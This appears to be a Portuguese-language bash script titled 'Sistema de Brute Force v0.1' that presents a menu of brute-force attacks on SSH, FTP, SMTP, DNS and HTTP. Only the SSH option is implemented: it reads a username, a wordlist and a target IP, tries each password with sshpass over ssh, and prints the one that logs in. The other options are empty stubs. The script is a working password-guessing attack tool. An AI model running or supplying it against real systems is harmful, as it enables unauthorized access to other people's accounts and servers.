#!/bin/bash

echo "Sistema de Brute Force v0.1"
echo "###################################"
echo "##    Escolha a Opção de acordo  ##"
echo "##    1 - Brute de SSH           ##"
echo "##    2 - Brute de FTP           ##"
echo "##    3 - Brute de SMTP          ##"
echo "##    4 - Brute de DNS           ##"
echo "##    5 - Brute de HTTP          ##"
echo "###################################"

echo "Por favor, digite um número: "
read opcao

case $opcao in
    1)

        # service ssh start
        # apt install sshpass

        echo "Qual é o usuário SSH que você deseja atacar?"
        read SSHUSER
        echo "Qual é a wordlist que você deseja usar?"
        read SSHWORDLIST
        echo "Qual é o IP do alvo que você deseja atacar?"
        read SSHALVO

        if ! test -e "$SSHWORDLIST"
        then
            exit 1
        fi

        echo "Lendo a Wordlist... Favor aguarde..."

        for SENHA in $(cat "$SSHWORDLIST")
        do
            echo "Usando a seguinte senha: $SENHA" 
            if sshpass -p "$SENHA" ssh "$SSHUSER"@"$SSHALVO" "echo Conexão bem-sucedida" >/dev/null 2>&1; then
                echo " Conexão bem-sucedida. A senha é: $SENHA"
                break
            fi
        done

        ;;
    2)
        echo "Você escolheu o número 2."
        ;;
    3)
        echo "Você escolheu o número 3."
        ;;
    4)
        echo "Você escolheu o número 4."
        ;;
    5)
        echo "Você escolheu o número 5."
        ;;
    *)
        echo "Opção inválida. Por favor, digite um número de 1 a 5."
        ;;
esac
